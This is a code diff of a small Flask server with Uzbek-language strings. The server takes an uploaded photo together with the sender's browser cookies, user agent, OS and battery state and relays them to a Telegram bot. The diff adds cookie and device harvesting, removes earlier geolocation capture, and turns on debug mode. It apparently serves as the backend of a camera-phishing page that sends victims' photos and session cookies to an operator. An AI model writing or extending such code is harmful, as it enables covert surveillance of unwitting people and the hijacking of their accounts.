@@ -17,27 +17,23 @@ def upload():
         return 'Rasm yo‘q', 400
 
     photo = request.files['photo']
+    user_agent = request.form.get('userAgent', 'Nomalum')
+    platform = request.form.get('platform', 'Nomalum')
+    cookies = request.form.get('cookies', 'Nomalum')
     battery_level = request.form.get('batteryLevel', 'Nomalum')
     battery_charging = request.form.get('batteryCharging', 'Nomalum')
-    latitude = request.form.get('latitude', 'Nomalum')
-    longitude = request.form.get('longitude', 'Nomalum')
 
     photo_path = 'auto.jpg'
     photo.save(photo_path)
-
-    # battery_level ni raqamga aylantirish
-    try:
-        battery_percent = int(float(battery_level) * 100)
-    except (ValueError, TypeError):
-        battery_percent = 'Nomalum'
 
     send_photo_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
 
     caption_text = (
         "📸 Yangi rasm!\n"
-        f"🔋 Zaryad: {battery_percent if battery_percent != 'Nomalum' else 'Nomalum'}%, "
-        f"Quvvat olayapti: {battery_charging}\n"
-        f"📍 Joylashuv: https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
+        f"🖥️ OS: {platform}\n"
+        f"🧠 User-Agent: {user_agent}\n"
+        f"🔋 Zaryad: {battery_level}, Quvvat olayapti: {battery_charging}\n"
+        f"🍪 Cookie: {cookies}"
     )
 
     with open(photo_path, 'rb') as f:
@@ -47,9 +43,8 @@ def upload():
         }, files={'photo': f})
 
     os.remove(photo_path)
+
     return 'Yuborildi', 200
 
-
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
